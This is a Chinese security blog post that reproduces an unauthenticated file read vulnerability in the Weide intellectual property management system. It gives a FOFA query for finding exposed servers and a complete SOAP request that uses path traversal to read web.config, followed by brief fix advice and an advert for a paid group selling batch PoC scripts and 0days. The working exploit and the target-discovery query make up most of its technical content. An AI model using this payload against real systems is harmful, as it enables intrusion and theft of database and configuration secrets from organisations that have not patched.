#  「漏洞复现」唯徳知识产权管理系统 DownloadFileWordTemplate 文件读取漏洞   
冷漠安全  冷漠安全   2024-09-17 10:04  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
唯徳知识产权管理系统，由深圳市唯德科创信息有限公司精心打造，旨在为企业及代理机构提供全方位、高效、安全的知识产权管理解决方案。该系统集成了专利、商标、版权等知识产权的全面管理功能，并通过云平台实现远程在线办公，提升工作效率。是一款集知识产权申请、管理、维护、分析于一体的综合性管理平台。它覆盖了从项目挖掘、提案评审、案件管理、代理协同、费用管理到期限管理等各个环节，实现了知识产权业务的全流程电子化、智能化管理。  
  
0x03  
  
**漏洞威胁**  
  
唯徳知识产权管理系统 DownloadFileWordTemplate 接口存在文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="JSCOMM/language.js"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oqOjcick4bEKCwLV5n3F11eYcJYdXvFBy1yY5L84zTmyCmtawoyhlru5wRtPF7ymHJicJm7HvvSicpQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /AutoUpdate/WSFM.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/DownloadFileWordTemplate"
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <DownloadFileWordTemplate xmlns="http://tempuri.org/">
      <fileName>../../web.config</fileName>
    </DownloadFileWordTemplate>
  </soap:Body>
</soap:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oqOjcick4bEKCwLV5n3F11elI7Q9ibvUiaYsNNqooc7tGTfLpH5ibhOEbiapc24Hm6ye8AlJBjQdohibkw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oqOjcick4bEKCwLV5n3F11eg7Xam98KUdxIDXDLjDic08rJFLD35NUSGEvJxZEcOnUC5UOMvFdttibQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oqOjcick4bEKCwLV5n3F11eG0LAtw4YR2w2Cet8SLcGVO8IKDrIeHpTIFPu1HJ3aSZLcNcTp3bbGQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0oqOjcick4bEKCwLV5n3F11eEqxRp2hke2zEnqRquneNcoBMCDGnXV1ibtU25Gu3YDicNvCn9UtNPbrw/640?wx_fmt=gif&from=appmsg "")  
  
  
